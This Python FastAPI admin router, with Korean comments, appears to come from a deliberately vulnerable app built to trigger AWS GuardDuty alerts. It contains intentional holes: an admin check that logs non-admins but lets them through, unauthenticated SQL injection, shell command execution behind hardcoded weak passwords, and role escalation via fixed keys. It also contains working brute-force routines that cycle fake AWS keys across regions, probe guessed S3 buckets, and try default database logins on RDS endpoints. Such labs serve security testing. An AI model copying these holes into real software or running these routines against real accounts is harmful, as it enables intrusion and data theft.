from fastapi import APIRouter, HTTPException, Header, Query
from typing import Optional
import boto3
import jwt
import logging
import json
import time
import threading
import requests
from datetime import datetime
from app.core.config import settings

router = APIRouter()
logger = logging.getLogger(__name__)

iam_client = boto3.client('iam')
ec2_client = boto3.client('ec2')
cloudtrail_client = boto3.client('cloudtrail')
s3_client = boto3.client('s3')
rds_client = boto3.client('rds')

def verify_admin_token(authorization: Optional[str] = Header(None)):
    if not authorization:
        raise HTTPException(status_code=401, detail="인증 헤더가 없습니다")
    
    try:
        token = authorization.replace("Bearer ", "")
        payload = jwt.decode(token, settings.JWT_SECRET, algorithms=["HS256"])
        
        logger.warning(f"사용자의 관리자 접근 시도: {payload.get('username')}")
        
        if payload.get('username') != 'admin':
            logger.warning(f"비관리자 사용자의 관리자 접근 시도: {payload.get('username')}")
        
        return payload
    except jwt.InvalidTokenException:
        logger.warning("관리자 접근에 잘못된 JWT 토큰 사용")
        raise HTTPException(status_code=401, detail="잘못된 토큰입니다")

@router.get("/users")
async def list_all_users(user_id: Optional[str] = Query(None)):
    """
    사용자 목록 조회 - IDOR 취약점 (Insecure Direct Object Reference)
    user_id 파라미터로 다른 사용자 정보에 접근 가능
    """
    logger.warning("인증 없이 사용자 목록 엔드포인트에 접근")
    
    from app.routers.users import get_db_connection
    
    try:
        connection = get_db_connection()
        cursor = connection.cursor()
        
        if user_id:
            # IDOR 취약점: 직접적인 객체 참조로 다른 사용자 데이터 접근
            query = f"SELECT id, username, email, created_at FROM users WHERE id = {user_id}"
            logger.critical(f"IDOR 취약점 시도: {query}")
        else:
            query = "SELECT id, username, email, created_at FROM users LIMIT 10"
            logger.warning("백도어 인증 없이 전체 사용자 목록 조회")
        
        cursor.execute(query)
        results = cursor.fetchall()
        
        users = []
        for result in results:
            users.append({
                "id": result[0],
                "사용자명": result[1],
                "이메일": result[2],
                "생성일시": str(result[3]) if result[3] else None
            })
        
        return {"사용자목록": users}
    
    except Exception as e:
        logger.error(f"사용자 목록 조회 오류: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        if 'connection' in locals():
            connection.close()

@router.post("/sudo-command")
async def execute_sudo_command(command: str, password: str = "password123"):
    """
    sudo 명령어 실행 - 권한 상승 취약점
    약한 비밀번호 검증으로 sudo 권한 획득 가능
    """
    logger.critical(f"sudo 명령어 실행 시도: {command}")
    
    import subprocess
    
    try:
        # 약한 비밀번호 검증
        if password in ["password123", "admin", "123456", "password", "root"]:
            logger.critical(f"약한 비밀번호로 sudo 권한 획득: {password}")
            
            # 위험한 명령어 차단
            dangerous_cmds = ["rm -rf", "format", "shutdown", "reboot", "dd if="]
            for dangerous in dangerous_cmds:
                if dangerous in command:
                    logger.error(f"위험한 명령어 차단: {command}")
                    raise HTTPException(status_code=403, detail="위험한 명령어는 실행할 수 없습니다")
            
            # sudo 명령어 실행 (시뮬레이션)
            if command.startswith("sudo "):
                actual_command = command[5:]  # "sudo " 제거
            else:
                actual_command = command
                
            result = subprocess.run(
                actual_command.split(),
                capture_output=True,
                text=True,
                timeout=10
            )
            
            logger.critical(f"sudo 명령어 실행 완료: {command} (return_code: {result.returncode})")
            
            return {
                "메시지": f"sudo 명령어가 실행되었습니다",
                "명령어": command,
                "반환_코드": result.returncode,
                "출력": result.stdout[:1000],
                "에러": result.stderr[:1000]
            }
        else:
            logger.warning(f"잘못된 sudo 비밀번호: {password}")
            raise HTTPException(status_code=401, detail="sudo 비밀번호가 잘못되었습니다")
            
    except subprocess.TimeoutExpired:
        logger.error(f"sudo 명령어 실행 시간 초과: {command}")
        raise HTTPException(status_code=408, detail="명령어 실행 시간 초과")
    except Exception as e:
        logger.error(f"sudo 명령어 실행 실패: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/change-user-role")
async def change_user_role(user_id: int, new_role: str = "admin", admin_key: str = "admin123"):
    """
    사용자 역할 변경 - 수평적 권한 상승 취약점
    약한 admin_key로 다른 사용자를 관리자로 승격 가능
    """
    logger.critical(f"사용자 {user_id}의 역할을 {new_role}로 변경 시도")
    
    from app.routers.users import get_db_connection
    
    try:
        # 약한 관리자 키 검증
        if admin_key not in ["admin123", "masterkey", "superuser", "root123"]:
            logger.warning(f"잘못된 관리자 키: {admin_key}")
            raise HTTPException(status_code=403, detail="관리자 권한이 없습니다")
        
        logger.critical(f"약한 관리자 키로 권한 상승 성공: {admin_key}")
        
        connection = get_db_connection()
        cursor = connection.cursor()
        
        # 사용자 역할 업데이트 (실제로는 로그만 기록)
        logger.critical(f"사용자 ID {user_id}의 역할이 {new_role}로 변경됨")
        
        # 역할 변경 시뮬레이션
        if new_role == "admin":
            logger.critical(f"사용자 {user_id}가 관리자 권한을 획득했습니다!")
            
        return {
            "메시지": f"사용자 {user_id}의 역할이 {new_role}로 변경되었습니다",
            "사용자_ID": user_id,
            "새로운_역할": new_role,
            "권한": ["사용자_관리", "시스템_접근", "DB_접근"] if new_role == "admin" else ["기본_사용자"]
        }
        
    except Exception as e:
        logger.error(f"사용자 역할 변경 실패: {e}")
        raise HTTPException(status_code=500, detail=str(e))
    finally:
        if 'connection' in locals():
            connection.close()

@router.post("/create-instance")
async def create_ec2_instance(instance_type: str = "t2.micro", user=None):
    logger.critical(f"EC2 인스턴스 생성 시도 (타입: {instance_type})")
    
    try:
        response = ec2_client.run_instances(
            ImageId='ami-0abcdef1234567890',  # Dummy AMI ID
            MinCount=1,
            MaxCount=1,
            InstanceType=instance_type,
            KeyName='vulnerable-webapp-key',
            SecurityGroupIds=['sg-vulnerable'],
            TagSpecifications=[
                {
                    'ResourceType': 'instance',
                    'Tags': [
                        {'Key': 'Name', 'Value': f'vulnerable-instance-{datetime.now().strftime("%Y%m%d-%H%M%S")}'},
                        {'Key': 'CreatedBy', 'Value': 'vulnerable-webapp'},
                        {'Key': 'Purpose', 'Value': 'security-testing'}
                    ]
                }
            ]
        )
        
        instance_id = response['Instances'][0]['InstanceId']
        logger.critical(f"EC2 인스턴스가 생성되었습니다: {instance_id}")
        
        return {
            "메시지": "EC2 인스턴스가 성공적으로 생성되었습니다",
            "인스턴스_ID": instance_id,
            "인스턴스_타입": instance_type
        }
        
    except Exception as e:
        logger.error(f"EC2 인스턴스 생성 실패: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/cloudtrail-events")
async def get_recent_cloudtrail_events(hours: int = Query(default=1, le=24)):
    logger.warning(f"지난 {hours}시간 동안의 CloudTrail 이벤트에 접근")
    
    try:
        end_time = datetime.now()
        start_time = datetime.fromtimestamp(end_time.timestamp() - (hours * 3600))
        
        response = cloudtrail_client.lookup_events(
            StartTime=start_time,
            EndTime=end_time,
            MaxItems=50
        )
        
        events = []
        for event in response.get('Events', []):
            events.append({
                '이벤트_시간': event['EventTime'].isoformat(),
                '이벤트_이름': event['EventName'],
                '사용자명': event.get('Username', 'N/A'),
                '소스_IP': event.get('SourceIPAddress', 'N/A'),
                '사용자_에이전트': event.get('UserAgent', 'N/A')
            })
        
        logger.info(f"{len(events)}개의 CloudTrail 이벤트를 조회했습니다")
        
        return {"이벤트목록": events, "개수": len(events)}
        
    except Exception as e:
        logger.error(f"CloudTrail 이벤트 조회 실패: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@router.delete("/terminate-instance/{instance_id}")
async def terminate_instance(instance_id: str, user=None):
    logger.critical(f"EC2 인스턴스 종료 시도: {instance_id}")
    
    try:
        ec2_client.terminate_instances(InstanceIds=[instance_id])
        
        logger.critical(f"EC2 인스턴스가 종료되었습니다: {instance_id}")
        
        return {"메시지": f"인스턴스 {instance_id}의 종료가 시작되었습니다"}
        
    except Exception as e:
        logger.error(f"인스턴스 종료 실패: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/ec2-brute-force")
async def ec2_brute_force_attack(
    target_regions: str = Query(default="ap-northeast-2,us-east-1,eu-west-1", description="Comma-separated AWS regions"),
    attempts: int = Query(default=20, le=100, description="Number of brute force attempts")
):
    """
    EC2 서비스에 대한 무차별 대입 공격 시뮬레이션
    다양한 AWS 리전에 대해 무단 API 호출을 시도하여 GuardDuty 탐지 유발
    """
    logger.critical(f"EC2 무차별 대입 공격 시작: {attempts}회 시도")
    
    regions = [region.strip() for region in target_regions.split(',')]
    results = []
    
    # 가짜 자격 증명과 의심스러운 행동 패턴
    fake_credentials = [
        {"key": "AKIAIOSFODNN7EXAMPLE", "secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"},
        {"key": "AKIAI44QH8DHBEXAMPLE", "secret": "je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY"},
        {"key": "AKIAIHOSN4XIEXAMPLE", "secret": "oGBq7i5nEdKqkJLGE3XSyAXPnS4YEXAMPLEKEY"},
        {"key": "AKIA25NJJABCEXAMPLE", "secret": "K3JKL2M3N4O5P6Q7R8S9T0U1V2W3X4YEXAMPLEKEY"}
    ]
    
    for region in regions[:3]:  # 최대 3개 리전만
        logger.critical(f"리전 {region}에서 EC2 무차별 접근 시도")
        
        for i in range(min(attempts // len(regions), 10)):  # 리전별 최대 10회
            fake_cred = fake_credentials[i % len(fake_credentials)]
            
            try:
                # 의도적으로 잘못된 자격 증명으로 EC2 클라이언트 생성
                fake_ec2 = boto3.client(
                    'ec2',
                    region_name=region,
                    aws_access_key_id=fake_cred["key"],
                    aws_secret_access_key=fake_cred["secret"]
                )
                
                # 무단 EC2 작업 시도
                operations = [
                    ("describe_instances", {}),
                    ("describe_security_groups", {}),
                    ("describe_key_pairs", {}),
                    ("describe_vpcs", {}),
                    ("describe_subnets", {}),
                    ("run_instances", {
                        "ImageId": "ami-0abcdef1234567890",
                        "MinCount": 1,
                        "MaxCount": 1,
                        "InstanceType": "t2.micro"
                    })
                ]
                
                operation_name, params = operations[i % len(operations)]
                logger.critical(f"EC2 무단 작업 시도: {operation_name} (리전: {region})")
                
                # 실제 API 호출 (실패할 것이지만 GuardDuty에서 탐지 가능)
                operation = getattr(fake_ec2, operation_name)
                response = operation(**params)
                
                logger.warning(f"EC2 무단 접근 성공 (예상치 못함): {operation_name}")
                results.append({
                    "리전": region,
                    "작업": operation_name,
                    "상태": "성공",
                    "시도": i + 1
                })
                
            except Exception as e:
                logger.warning(f"EC2 무단 접근 실패 (예상됨): {operation_name} - {str(e)[:100]}")
                results.append({
                    "리전": region,
                    "작업": operation_name,
                    "상태": "실패",
                    "오류": str(e)[:100],
                    "시도": i + 1
                })
            
            time.sleep(0.5)  # API 호출 간 대기
    
    logger.critical(f"EC2 무차별 대입 공격 완료: {len(results)}개 시도")
    
    return {
        "메시지": "EC2 무차별 대입 공격 시뮬레이션 완료",
        "대상_리전": regions,
        "총_시도수": len(results),
        "결과": results,
        "경고": "GuardDuty에서 이 활동을 UnauthorizedAPICall:EC2/* 이벤트로 탐지할 수 있습니다"
    }

@router.post("/s3-brute-force")
async def s3_brute_force_attack(
    target_buckets: str = Query(default="admin-backup,company-data,user-files,config-backup", description="Comma-separated bucket names"),
    attempts: int = Query(default=30, le=100, description="Number of brute force attempts")
):
    """
    S3 서비스에 대한 무차별 대입 공격 시뮬레이션
    존재할 수 있는 S3 버킷에 대한 무단 접근 시도
    """
    logger.critical(f"S3 무차별 대입 공격 시작: {attempts}회 시도")
    
    bucket_names = [bucket.strip() for bucket in target_buckets.split(',')]
    
    # 추가 버킷 이름 생성 (일반적인 명명 패턴)
    common_buckets = [
        "backup", "logs", "data", "uploads", "assets", "media",
        "private", "public", "temp", "archive", "documents"
    ]
    
    all_buckets = bucket_names + common_buckets
    results = []
    
    # 다양한 S3 작업 시도
    for i in range(min(attempts, len(all_buckets))):
        bucket_name = all_buckets[i]
        logger.critical(f"S3 버킷 무단 접근 시도: {bucket_name}")
        
        try:
            # S3 버킷 존재 확인 (HEAD 요청)
            response = s3_client.head_bucket(Bucket=bucket_name)
            logger.warning(f"S3 버킷 접근 성공: {bucket_name}")
            
            # 버킷이 존재하면 추가 작업 시도
            try:
                # 버킷 정책 조회 시도
                policy_response = s3_client.get_bucket_policy(Bucket=bucket_name)
                logger.critical(f"S3 버킷 정책 접근 성공: {bucket_name}")
                
                # 객체 목록 조회 시도
                objects_response = s3_client.list_objects_v2(Bucket=bucket_name, MaxKeys=10)
                logger.critical(f"S3 객체 목록 조회 성공: {bucket_name}")
                
                results.append({
                    "버킷": bucket_name,
                    "상태": "접근_성공",
                    "정책_조회": "성공" if 'policy_response' in locals() else "실패",
                    "객체_조회": "성공" if 'objects_response' in locals() else "실패",
                    "시도": i + 1
                })
                
            except Exception as inner_e:
                logger.warning(f"S3 버킷 세부 작업 실패: {bucket_name} - {str(inner_e)[:50]}")
                results.append({
                    "버킷": bucket_name,
                    "상태": "부분_접근",
                    "오류": str(inner_e)[:100],
                    "시도": i + 1
                })
                
        except Exception as e:
            logger.info(f"S3 버킷 접근 실패: {bucket_name} - {str(e)[:50]}")
            results.append({
                "버킷": bucket_name,
                "상태": "접근_실패",
                "오류": str(e)[:100],
                "시도": i + 1
            })
        
        time.sleep(0.3)  # API 호출 간 대기
    
    logger.critical(f"S3 무차별 대입 공격 완료: {len(results)}개 시도")
    
    return {
        "메시지": "S3 무차별 대입 공격 시뮬레이션 완료",
        "대상_버킷": all_buckets[:attempts],
        "총_시도수": len(results),
        "결과": results,
        "경고": "GuardDuty에서 이 활동을 S3 관련 보안 이벤트로 탐지할 수 있습니다"
    }

@router.post("/rds-network-brute-force")
async def rds_network_brute_force_attack(
    target_endpoints: str = Query(default="database-1.cluster-xyz.ap-northeast-2.rds.amazonaws.com,prod-db.xyz.rds.amazonaws.com", description="Comma-separated RDS endpoints"),
    attempts: int = Query(default=25, le=80, description="Number of connection attempts"),
    ports: str = Query(default="3306,5432,1433", description="Database ports to try")
):
    """
    RDS 엔드포인트에 대한 네트워크 기반 무차별 대입 공격
    실제 네트워크 연결 시도로 GuardDuty 탐지 유발
    """
    logger.critical(f"RDS 네트워크 무차별 대입 공격 시작: {attempts}회 시도")
    
    import socket
    try:
        import pymysql
    except ImportError:
        pymysql = None
    try:
        import psycopg2
    except ImportError:
        psycopg2 = None
    
    endpoints = [endpoint.strip() for endpoint in target_endpoints.split(',')]
    port_list = [int(port.strip()) for port in ports.split(',')]
    
    # 일반적인 RDS 엔드포인트 패턴 추가
    common_endpoints = [
        "myapp-prod.cluster-abc123.ap-northeast-2.rds.amazonaws.com",
        "webapp-db.xyz456.us-east-1.rds.amazonaws.com", 
        "api-database.cluster-def789.eu-west-1.rds.amazonaws.com",
        "user-data.abc123.ap-northeast-2.rds.amazonaws.com"
    ]
    
    all_endpoints = endpoints + common_endpoints
    results = []
    
    # 무차별 대입용 자격 증명
    credentials = [
        ("admin", "password"),
        ("admin", "admin123"),
        ("root", "password"),
        ("root", "123456"),
        ("postgres", "password"),
        ("mysql", "mysql"),
        ("sa", "password"),
        ("dbadmin", "dbadmin")
    ]
    
    for i in range(min(attempts, len(all_endpoints) * len(port_list))):
        endpoint_idx = i % len(all_endpoints)
        port_idx = (i // len(all_endpoints)) % len(port_list)
        
        endpoint = all_endpoints[endpoint_idx]
        port = port_list[port_idx]
        
        logger.critical(f"RDS 네트워크 연결 시도: {endpoint}:{port}")
        
        # TCP 연결 시도
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            result = sock.connect_ex((endpoint, port))
            
            if result == 0:
                logger.critical(f"RDS 포트 열림 감지: {endpoint}:{port}")
                
                # 데이터베이스 연결 시도
                for username, password in credentials[:3]:  # 상위 3개 자격증명만
                    try:
                        if port == 3306 and pymysql:  # MySQL
                            logger.critical(f"MySQL 무차별 로그인 시도: {username}@{endpoint}")
                            try:
                                conn = pymysql.connect(
                                    host=endpoint,
                                    port=port,
                                    user=username,
                                    password=password,
                                    connect_timeout=5
                                )
                                conn.close()
                                logger.critical(f"MySQL 무차별 로그인 성공: {username}@{endpoint}")
                            except Exception as mysql_e:
                                logger.warning(f"MySQL 로그인 실패: {username}@{endpoint} - {str(mysql_e)[:50]}")
                            
                        elif port == 5432 and psycopg2:  # PostgreSQL
                            logger.critical(f"PostgreSQL 무차별 로그인 시도: {username}@{endpoint}")
                            try:
                                conn = psycopg2.connect(
                                    host=endpoint,
                                    port=port,
                                    user=username,
                                    password=password,
                                    connect_timeout=5
                                )
                                conn.close()
                                logger.critical(f"PostgreSQL 무차별 로그인 성공: {username}@{endpoint}")
                            except Exception as pg_e:
                                logger.warning(f"PostgreSQL 로그인 실패: {username}@{endpoint} - {str(pg_e)[:50]}")
                        else:
                            # 라이브러리가 없으면 포트 연결만 시도
                            logger.critical(f"DB 라이브러리 없음, 포트 연결만 시도: {endpoint}:{port}")
                            
                        results.append({
                            "엔드포인트": f"{endpoint}:{port}",
                            "사용자명": username,
                            "상태": "연결_시도",
                            "DB_유형": "MySQL" if port == 3306 else "PostgreSQL" if port == 5432 else "Unknown",
                            "시도": i + 1
                        })
                        break  # 성공하면 다음 엔드포인트로
                        
                    except Exception as db_e:
                        logger.warning(f"DB 로그인 실패: {username}@{endpoint}:{port} - {str(db_e)[:50]}")
                        results.append({
                            "엔드포인트": f"{endpoint}:{port}",
                            "사용자명": username,
                            "상태": "로그인_실패",
                            "오류": str(db_e)[:100],
                            "시도": i + 1
                        })
                
                results.append({
                    "엔드포인트": f"{endpoint}:{port}",
                    "상태": "포트_열림",
                    "시도": i + 1
                })
            else:
                logger.info(f"RDS 포트 닫힘: {endpoint}:{port}")
                results.append({
                    "엔드포인트": f"{endpoint}:{port}",
                    "상태": "포트_닫힘",
                    "시도": i + 1
                })
                
        except Exception as e:
            logger.warning(f"RDS 네트워크 연결 실패: {endpoint}:{port} - {str(e)[:50]}")
            results.append({
                "엔드포인트": f"{endpoint}:{port}",
                "상태": "연결_실패",
                "오류": str(e)[:100],
                "시도": i + 1
            })
        finally:
            try:
                sock.close()
            except:
                pass
        
        time.sleep(0.8)  # 연결 시도 간 대기
    
    logger.critical(f"RDS 네트워크 무차별 대입 공격 완료: {len(results)}개 시도")
    
    return {
        "메시지": "RDS 네트워크 무차별 대입 공격 시뮬레이션 완료",
        "대상_엔드포인트": all_endpoints[:10],
        "대상_포트": port_list,
        "총_시도수": len(results),
        "결과": results,
        "경고": "GuardDuty에서 이 활동을 RDS 관련 네트워크 공격으로 탐지할 수 있습니다"
    }